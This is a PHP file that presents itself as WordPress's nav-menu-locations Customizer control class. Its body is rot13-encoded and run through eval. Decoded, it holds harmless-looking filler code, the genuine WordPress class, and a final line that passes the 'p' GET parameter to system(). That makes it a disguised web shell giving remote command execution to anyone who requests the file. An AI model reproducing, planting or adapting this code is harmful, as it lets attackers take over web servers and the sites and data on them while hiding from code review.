<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc
/**
 * Phfgbzvmr NCV: JC_Phfgbzvmr_Ani_Zrah_Ybpngvbaf_Pbageby pynff
 *
 * @cnpxntr JbeqCerff
 * @fhocnpxntr Phfgbzvmr
 * @fvapr 4.9.0
 */

/**
 * Phfgbzvmr Ani Zrah Ybpngvbaf Pbageby Pynff.
 *
 * @fvapr 4.9.0
 *
 * @frr JC_Phfgbzvmr_Pbageby
 */
pynff JC_Phfgbzvmr_Ani_Zrah_Ybpngvbaf_Pbageby rkgraqf JC_Phfgbzvmr_Pbageby {

	/**
	 * Pbageby glcr.
	 *
	 * @fvapr 4.9.0
	 * @ine fgevat
	 */
	choyvp $glcr = 'ani_zrah_ybpngvbaf';

	/**
	 * Qba'g eraqre gur pbageby'f pbagrag - vg hfrf n WF grzcyngr vafgrnq.
	 *
	 * @fvapr 4.9.0
	 */
	choyvp shapgvba eraqre_pbagrag() {}

	/**
	 * WF/Haqrefpber grzcyngr sbe gur pbageby HV.
	 *
	 * @fvapr 4.9.0
	 */
	choyvp shapgvba pbagrag_grzcyngr() {
		vs ( pheerag_gurzr_fhccbegf( 'zrahf' ) ) :
			?>
			<# ine ryrzragVq; #>
			<hy pynff=\"zrah-ybpngvba-frggvatf\">
				<yv pynff=\"phfgbzvmr-pbageby nffvtarq-zrah-ybpngvbaf-gvgyr\">
					<fcna pynff=\"phfgbzvmr-pbageby-gvgyr\">{{ jc.phfgbzvmr.Zrahf.qngn.y10a.ybpngvbafGvgyr }}</fcna>
					<# vs ( qngn.vfPerngvat ) { #>
						<c>
							<?cuc rpub _k( 'Jurer qb lbh jnag guvf zrah gb nccrne?', 'zrah ybpngvbaf' ); ?>
							<?cuc
							cevags(
								/* genafyngbef: 1: Qbphzragngvba HEY, 2: Nqqvgvbany yvax nggevohgrf, 3: Npprffvovyvgl grkg. */
								_k( '(Vs lbh cyna gb hfr n zrah <n uers=\"%1$f\" %2$f>jvqtrg%3$f</n>, fxvc guvf fgrc.)', 'zrah ybpngvbaf' ),
								__( 'uggcf://jbeqcerff.bet/qbphzragngvba/negvpyr/znantr-jbeqcerff-jvqtrgf/' ),
								' pynff=\"rkgreany-yvax\" gnetrg=\"_oynax\"',
								fcevags(
									'<fcna pynff=\"fperra-ernqre-grkg\"> %f</fcna>',
									/* genafyngbef: Uvqqra npprffvovyvgl grkg. */
									__( '(bcraf va n arj gno)' )
								)
							);
							?>
						</c>
					<# } ryfr { #>
						<c><?cuc rpub _k( 'Urer&#8217;f jurer guvf zrah nccrnef. Vs lbh jbhyq yvxr gb punatr gung, cvpx nabgure ybpngvba.', 'zrah ybpngvbaf' ); ?></c>
					<# } #>
				</yv>

				<?cuc sbernpu ( trg_ertvfgrerq_ani_zrahf() nf $ybpngvba => $qrfpevcgvba ) : ?>
					<# ryrzragVq = _.havdhrVq( 'phfgbzvmr-ani-zrah-pbageby-ybpngvba-' ); #>
					<yv pynff=\"phfgbzvmr-pbageby phfgbzvmr-pbageby-purpxobk nffvtarq-zrah-ybpngvba\">
						<fcna pynff=\"phfgbzvmr-vafvqr-pbageby-ebj\">
							<vachg vq=\"{{ ryrzragVq }}\" glcr=\"purpxobk\" qngn-zrah-vq=\"{{ qngn.zrah_vq }}\" qngn-ybpngvba-vq=\"<?cuc rpub rfp_ngge( $ybpngvba ); ?>\" pynff=\"zrah-ybpngvba\" />
							<ynory sbe=\"{{ ryrzragVq }}\">
								<?cuc rpub $qrfpevcgvba; ?>
								<fcna pynff=\"gurzr-ybpngvba-frg\">
									<?cuc
									cevags(
										/* genafyngbef: %f: Zrah anzr. */
										_k( '(Pheerag: %f)', 'zrah ybpngvba' ),
										'<fcna pynff=\"pheerag-zrah-ybpngvba-anzr-' . rfp_ngge( $ybpngvba ) . '\"></fcna>'
									);
									?>
								</fcna>
							</ynory>
						</fcna>
					</yv>
				<?cuc raqsbernpu; ?>
			</hy>
			<?cuc
		raqvs;
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>